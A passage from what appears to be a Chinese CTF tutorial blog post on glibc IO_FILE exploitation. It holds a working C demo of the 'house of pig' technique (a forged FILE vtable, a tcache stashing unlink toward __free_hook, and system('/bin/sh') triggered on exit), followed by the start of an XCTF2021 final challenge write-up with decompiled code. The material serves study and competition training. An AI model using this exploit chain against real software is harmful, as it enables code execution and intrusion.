class="string">&quot;三个字段修改完成。但我们需要修改的可不止这三个字段。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;在这个判断条件通过后，我们将会进入overflow函数。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;house of pig的一个重要思想就是让其执行_IO_str_overflow函数。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;这需要我们在vtable中写入_IO_str_jumps的地址，其中保存有这个函数的地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;看一下IDA中的_IO_str_jumps结构体：\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9560 qword_1E9560    dq 0                    ; DATA XREF: sub_52C20+49A↑o\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9560                                         ; sscanf+B5↑o ...\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9568                 dq 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9570                 dq offset sub_93D50\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\033[1;31m__libc_IO_vtables:00000000001E9578                 dq offset _IO_str_overflow\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9580                 dq offset _IO_str_underflow\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9588                 dq offset _IO_default_uflow\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9590                 dq offset _IO_str_pbackfail\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9598                 dq offset _IO_default_xsputn\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95A0                 dq offset _IO_default_xsgetn\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95A8                 dq offset _IO_str_seekoff\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95B0                 dq offset sub_92600\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95B8                 dq offset sub_924E0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95C0                 dq offset sub_92870\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95C8                 dq offset _IO_default_doallocate\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95D0                 dq offset sub_937F0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95D8                 dq offset sub_93800\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95E0                 dq offset sub_937D0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95E8                 dq offset sub_92870\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95F0                 dq offset sub_937E0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E95F8                 dq offset sub_93810\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;__libc_IO_vtables:00000000001E9600                 dq offset sub_93820\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;其偏移为0x1E9560。将其填充到vtable字段，偏移为0xD8。\n&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> _IO_str_jumps = libc_base + <span class="number">0x1E9560</span>;</span><br><span class="line">    fake_FILE[<span class="number">0xD8</span> / <span class="number">8</span>] = _IO_str_jumps;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;然后，我们进入_IO_str_overflow函数看看。\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/strops.c, line 80)\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;int\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_str_overflow (FILE *fp, int c)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int flush_only = c == EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  size_t pos;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (fp-&gt;_flags &amp; _IO_NO_WRITES)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      return flush_only ? 0 : EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (pos &gt;= (size_t) (_IO_blen (fp) + flush_only))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\treturn EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      else\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\033[1;31m\t  char *new_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  char *old_buf = fp-&gt;_IO_buf_base;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  size_t old_blen = _IO_blen (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  size_t new_size = 2 * old_blen + 100;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  if (new_size &lt; old_blen)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    return EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  new_buf = malloc (new_size);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  if (new_buf == NULL)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      /*\t  __ferror(fp) = 1; */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      return EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  if (old_buf)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      memcpy (new_buf, old_buf, old_blen);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      free (old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      /* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t      fp-&gt;_IO_buf_base = NULL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t    &#125;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  memset (new_buf + old_blen, &#x27;\\0&#x27;, new_size - old_blen);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  _IO_setb (fp, new_buf, new_buf + new_size, 1);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_write_base = new_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t&#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (!flush_only)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    *fp-&gt;_IO_write_ptr++ = (unsigned char) c;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (flush_only)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  else\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    return c;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;注意红色部分的代码，这里会连续调用malloc、memcpy、free函数。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;house of pig想要在这里大做文章。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;首先需要通过tcache stashing unlink attack或其他方法向tcache中插入__free_hook附近的地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;然后在运行到此时，首先通过malloc分配出来，然后memcpy将指定位置的内容复制到__free_hook。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;最后通过free函数执行__free_hook中的内容，这里将__free_hook修改为system函数地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;通过代码我们可以知道，memcpy是将_IO_buf_base（结构体内偏移0x38）地址处的内容复制到__free_hook。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;而这个复制的原地址是我们可控的，需要我们在伪造的FILE结构体中设置。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;这里我们设置这个地址的值为第一个chunk的地址+0x20。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;............\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE[<span class="number">0x38</span> / <span class="number">8</span>] = chunk_1 + <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;设置完成。之后我们需要注意malloc函数申请的chunk大小，其申请的大小需要经过计算。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;计算方式是：(_IO_buf_end - _IO_buf_base) * 2 + 100。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;这要求我们正确设置_IO_buf_end的值。如果使用0x100的tcache进行攻击，则end-base=0x46。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;据此设置_IO_buf_end为第一个chunk的地址+0x20+0x46（结构体内偏移0x40）。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;............\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE[<span class="number">0x40</span> / <span class="number">8</span>] = chunk_1 + <span class="number">0x20</span> + <span class="number">0x46</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;设置完成。最后注意free函数的参数是FILE结构体的起始地址，因此在第二个chunk+0x20处写入\&quot;/bin/sh\\x00\&quot;。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;另外在第二个chunk+0x30处写入system函数地址，memcpy函数能够将这里的地址复制到__free_hook。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span>*)(chunk_1 + <span class="number">0x20</span>), <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)(chunk_1 + <span class="number">0x20</span> + <span class="number">0x10</span>) = (<span class="type">size_t</span>)system;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;............\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;设置完成。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第五步：通过tcache stashing unlink attack在tcache写入__free_hook附近地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;当赛题中只使用calloc时，只有在tcache中存放堆地址，才能让malloc分配到__free_hook。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;下面进行这种攻击的常规流程：\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;首先分配9个chunk并释放，7个到tcache，2个到small bins。然后分配两个tcache chunk出来。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span>* chunks[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)</span><br><span class="line">        chunks[i] = <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">// to avoid consolidate</span></span><br><span class="line">    chunks[<span class="number">7</span>] = <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">// to avoid consolidate</span></span><br><span class="line">    chunks[<span class="number">8</span>] = <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);   <span class="comment">// to avoid consolidate</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">9</span>; i++)</span><br><span class="line">        <span class="built_in">free</span>(chunks[i]);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xF0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;依次释放9个chunk，tcache中的chunk应该为：7-&gt;6-&gt;5-&gt;4-&gt;3-&gt;2-&gt;1。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;unsorted bin中的chunk应该为：9&lt;-&gt;8。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;然后分配出来两个tcache chunk，再分配一个较大的chunk，让unsorted bin的两个chunk进入small bins。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;应该修改第9个chunk的bk指针为__free_hook附近地址。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;............\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">size_t</span>*)((<span class="type">size_t</span>)(chunks[<span class="number">8</span>]) + <span class="number">0x8</span>) = __free_hook - <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;修改完成，之后分配一个出来进行攻击。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="number">0xF0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;已经分配出来了一个chunk，现在0x100的tcache中的第一个chunk就是__free_hook附近的地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf_color</span>(RED, HIGHLIGHT, <span class="string">&quot;第六步：调用exit函数触发house of pig漏洞。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf_color</span>(GREEN, UNDEFINED, <span class="string">&quot;现在，所有的东西都已经布置好了，只需要一个exit函数，我们就能够执行预期的函数调用链并getshell。\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="XCTF2021final-house-of-pig"><a href="#XCTF2021final-house-of-pig" class="headerlink" title="[XCTF2021final] house of pig"></a>[XCTF2021final] house of pig</h2><h4 id="检查信息-2"><a href="#检查信息-2" class="headerlink" title="检查信息"></a>检查信息</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028104920747.png"
                      alt="image-20231028104920747"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028104935630.png"
                      alt="image-20231028104935630"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028105055649.png"
                      alt="image-20231028105055649"
                ></p>
<p>没找到原 <code>libc</code>，这里使用如上 <code>libc</code> 。</p>
<h4 id="试运行-3"><a href="#试运行-3" class="headerlink" title="试运行"></a>试运行</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/27/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_IO_FILE%E5%8F%8A%E7%9B%B8%E5%85%B3%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231028105250592.png"
                      alt="image-20231028105250592"
                ></p>
<h4 id="逆向分析-4"><a href="#逆向分析-4" class="headerlink" title="逆向分析"></a>逆向分析</h4><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> id; <span class="comment">// [rsp+0h] [rbp-420h]</span></span><br><span class="line">  <span class="type">int</span> new_id; <span class="comment">// [rsp+4h] [rbp-41Ch]</span></span><br><span class="line">  Info *info; <span class="comment">// [rsp+8h] [rbp-418h]</span></span><br><span class="line">  Info info1; <span class="comment">// [rsp+10h] [rbp-410h] BYREF</span></span><br><span class="line">  Info info2; <span class="comment">// [rsp+160h] [rbp-2C0h] BYREF</span></span><br><span class="line">  Info info3; <span class="comment">// [rsp+2B0h] [rbp-170h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+408h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">init_state</span>();</span><br><span class="line">  <span class="built_in">welcome</span>();</span><br><span class="line">  <span class="built_in">init_info1</span>(&amp;info1);</span><br><span class="line">  <span class="built_in">init_info2</span>(&amp;info2);</span><br><span class="line">  <span class="built_in">init_info3</span>(&amp;info3);</span><br><span class="line">  id = <span class="number">1</span>;</span><br><span class="line">  v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Peppa Pig first~&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  info = &amp;info1;</span><br><span class="line">  <span class="built_in">get_info1</span>(&amp;info1);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="keyword">switch</span> ( <span class="built_in">get_num</span>() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">add</span>(info, id);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">show</span>(info, id);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">edit</span>(info, id);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">delete</span>(info, id);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        new_id = <span class="built_in">login</span>();</span><br><span class="line">        <span class="keyword">if</span> ( new_id &amp;&amp; new_id != id )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">switch</span> ( id )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">              <span class="built_in">set_info1</span>(info);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">              <span class="built_in">set_info2</span>(info);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">              <span class="built_in">set_info3</span>(info);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          id = new_id;</span><br><span class="line">          <span class="keyword">switch</span> ( new_id )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">              v4 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;This is Peppa Pig~&quot;</span>);</span><br><span class="line">              std::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">              info = &amp;info1;</span><br><span class="line">              <span class="built_in">get_info1</span>(&amp;info1);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">              v5 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;This is Mummy Pig~&quot;</span>);</span><br><span class="line">              std::ostream::<span class="keyword">operator</span>&lt;&lt;(v5, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">              info = &amp;info2;</span><br><span class="line">              <span class="built_in">get_info2</span>(&amp;info2);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">              v6 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;This is Daddy Pig~&quot;</span>);</span><br><span class="line">              std::ostream::<span class="keyword">operator</span>&lt;&lt;(v6, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">              info = &amp;info3;</span><br><span class="line">              <span class="built_in">get_info3</span>(&amp;info3);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid...&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>一道 <code>c++</code> 的 <code>pwn</code> 题。三只猪用户，一共五种操作，添加，查看，修改，删除，登录。最开始默认<code>peppa</code>（猪A）先操作，猪A的 <code>id=1</code> ，<code>Mummy</code> （猪B）的 <code>id=2</code>，<code>Daddy</code> （猪C）的 <code>id=3</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">add</span><span class="params">(Info *info, <span class="type">int</span> id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">switch</span> ( id )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">add_1</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">add_2</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">add_3</span>(info);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">add_1</span><span class="params">(Info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span 